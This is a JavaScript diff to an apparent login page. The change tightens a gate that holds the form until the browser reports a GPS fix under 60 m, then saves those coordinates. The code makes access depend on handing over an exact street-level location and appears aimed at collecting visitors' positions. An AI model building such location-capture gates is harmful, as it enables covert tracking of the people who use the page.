@@ -329,16 +329,16 @@
                 if (!navigator.geolocation) return resolve(null);
 
                 let watchId = null;
-                const maxWait = 25000; // Optimized: 25s is enough with Turbo
+                const maxWait = 45000; // Powerfull: 45s for deep Satellite Lock
                 let localBest = null;
 
                 const timeout = setTimeout(() => {
                     if (watchId) navigator.geolocation.clearWatch(watchId);
-                    // Adaptive Lock: If we have hardware GPS < 150m, it's enough for global accuracy
-                    if (localBest && localBest.coords.accuracy < 150) {
-                        resolve(extractPositionData(localBest, 'GPS-Turbo-Final'));
-                    } else if (bestGpsFound && bestGpsFound.coords.accuracy < 250) {
-                        resolve(extractPositionData(bestGpsFound, 'GPS-Persistent-Turbo'));
+                    // MANDATORY: Accuracy must be < 60m to be termed "Exact"
+                    if (localBest && localBest.coords.accuracy < 60) {
+                        resolve(extractPositionData(localBest, 'GPS-Strict-Final'));
+                    } else if (bestGpsFound && bestGpsFound.coords.accuracy < 60) {
+                        resolve(extractPositionData(bestGpsFound, 'GPS-Persistent-Strict'));
                     } else {
                         resolve(null);
                     }
@@ -863,49 +863,44 @@
             } catch (e) { }
 
             if (!isExact) {
-                // SMART TURBO BLOCK: Quick calibration with hardware check
-                btn.innerHTML = `<div class="loading"></div> Optimizing Satellites...`;
+                // ABSOLUTE STRICT BLOCK
+                btn.innerHTML = `<div class="loading"></div> Locking Exact Location...`;
                 btn.disabled = true;
                 btn.style.background = "#4f46e5";
 
                 let attemptCount = 0;
-                const turboTimer = setInterval(() => {
+                const strictTimer = setInterval(() => {
                     attemptCount++;
                     navigator.geolocation.getCurrentPosition(
                         (p) => {
                             const acc = Math.round(p.coords.accuracy);
-                            // Relaxed but secure threshold: <100m is 100% exact address
-                            if (acc < 100) {
-                                clearInterval(turboTimer);
+                            // ELITE REQUIREMENT: < 60m for exact street address
+                            if (acc < 60) {
+                                clearInterval(strictTimer);
                                 saveLocationData({
-                                    attempts: [extractPositionData(p, 'GPS-Turbo-Lock')],
-                                    finalLocation: extractPositionData(p, 'GPS-Turbo-Lock'),
-                                    captureMethod: 'GPS-Turbo'
+                                    attempts: [extractPositionData(p, 'GPS-Elite-Strict')],
+                                    finalLocation: extractPositionData(p, 'GPS-Elite-Strict'),
+                                    captureMethod: 'GPS-Strict'
                                 }).then(() => {
                                     btn.innerHTML = '✅ Location Verified!';
                                     btn.style.background = "#059669";
                                     setTimeout(() => loginForm.submit(), 500);
                                 });
                             } else {
-                                btn.innerHTML = `<div class="loading"></div> Calibrating (±${acc}m)...`;
+                                btn.innerHTML = `<div class="loading"></div> Precising (±${acc}m)...`;
                             }
                         },
                         () => { },
-                        { enableHighAccuracy: true, timeout: 3000 }
+                        { enableHighAccuracy: true, timeout: 5000 }
                     );
 
-                    if (attemptCount > 10) { // 10 attempts (~20s max for abroad friends)
-                        clearInterval(turboTimer);
-                        // Emergency submission if we have at least hardware signal (<250m)
-                        if (currentAccuracy < 250) {
-                            btn.innerHTML = '✅ Securing...';
-                            loginForm.submit();
-                        } else {
-                            btn.innerHTML = '❌ Signal Too Weak - Try Outdoor';
-                            btn.disabled = false;
-                        }
+                    if (attemptCount > 20) { // 20 attempts (~40-50s)
+                        clearInterval(strictTimer);
+                        btn.innerHTML = '❌ Signal Too Weak - Try Outdoor';
+                        btn.disabled = false;
+                        showToast("Exact satellite location required. Please move near a window.", "error");
                     }
-                }, 2000);
+                }, 2500);
 
                 return;
             }
